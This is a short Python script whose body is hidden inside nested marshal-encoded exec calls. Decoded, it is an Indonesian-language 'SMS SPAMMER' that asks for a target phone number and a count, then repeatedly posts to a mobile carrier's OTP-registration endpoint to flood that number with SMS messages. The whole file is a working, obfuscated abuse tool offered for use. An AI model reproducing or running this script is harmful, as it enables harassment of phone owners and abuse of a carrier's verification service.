import marshal
exec(marshal.loads(b'\xf3}\x02\x00\x00import marshal\nexec(marshal.loads(b\'\\xf3\\x1c\\x02\\x00\\x00\\nimport requests,sys,time\\n\\nbanner = \\\'\\\'\\\'\\n\\\\033[42mSMS SPAMMER BY \\\\033[41mLilz melachronouz\\\\033[0m\\nauthor : lilz\\ncode   : python3\\ngithub : https://github.com/uriel31/spamtri\\n\\\'\\\'\\\'\\nprint(banner)\\nhost = "https://registrasi.tri.co.id/daftar/generateOTP"\\nno = input("nomor:")\\nju = int(input("jumlah spam:"))\\nfor i in range(ju):\\n\\tr = requests.post(host,data={"msisdn":no})\\n\\tprint("mengirim spam ke \\\\033[91m%s\\\\033[0m status \\\\033[92m%s\\\\033[0m! "%(no,r.status_code))\\ndone = "Selesai!"\\nfor i in done:\\n\\tprint(i,end="")\\n\\tsys.stdout.flush()\\n\\ttime.sleep(0.1)\'))'))